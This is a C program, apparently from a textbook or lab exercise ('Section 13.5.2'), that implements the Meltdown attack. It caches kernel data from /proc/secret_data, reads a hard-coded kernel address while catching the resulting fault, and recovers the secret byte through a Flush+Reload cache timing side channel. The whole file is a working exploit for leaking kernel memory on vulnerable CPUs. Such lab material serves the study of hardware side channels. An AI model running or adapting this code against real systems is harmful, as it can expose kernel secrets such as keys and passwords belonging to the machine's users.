#define _XOPEN_SOURCE 500
#include <setjmp.h>
#include <signal.h>
#include <fcntl.h>      /* For open() */
#include <x86intrin.h>
#include <unistd.h>     /* For pread() */
#include <stdint.h>
#include <stdio.h>

uint8_t array[256 * 4096];
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
    int i;

    /* Write to array to bring it to RAM to prevent COW */
    for (i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1;
    }
    /* Flush the values of the array from cache */
    for (i = 0; i < 256; i++) {
       _mm_clflush(&array[i * 4096 + DELTA]);
    }
}

void reloadSideChannel()
{
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for (i = 0; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("array[%d * 4096 + %d] is in cache!\n", i, DELTA);
            printf("The secret is %d.\n", i);
        }
    }
}

void meltdown(unsigned long kernel_data_addr)
{
    char kernel_data = 0;
    /* The following statemnet will cause an exception */
    kernel_data = *(char *)kernel_data_addr;
    // array[7 * 4096 + DELTA] += 1;
    array[kernel_data * 4096 + DELTA] += 1;
}

/* Signal handler*/
static sigjmp_buf jbuf;
static void catch_segv()
{
    siglongjmp(jbuf, 1);
}

int main()
{
    /* Register a signal handler */
    signal(SIGSEGV, catch_segv);

    /* Flush the probing array */
    flushSideChannel();

    /* Section 13.5.2: We need to get the kernel secret data cached */
    /* First, open the /proc/secret_data virtual file */
    int fd = open("/proc/secret_data", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    /* Then, cause the secret data to be cached */
    ssize_t ret = pread(fd, NULL, 0, 0);

    if (sigsetjmp(jbuf, 1) == 0) {
        meltdown(0xfd2aab32);
    } else {
        printf("Memory access violation!\n");
    }

    /* Reload the probing array */
    reloadSideChannel();

    return 0;
}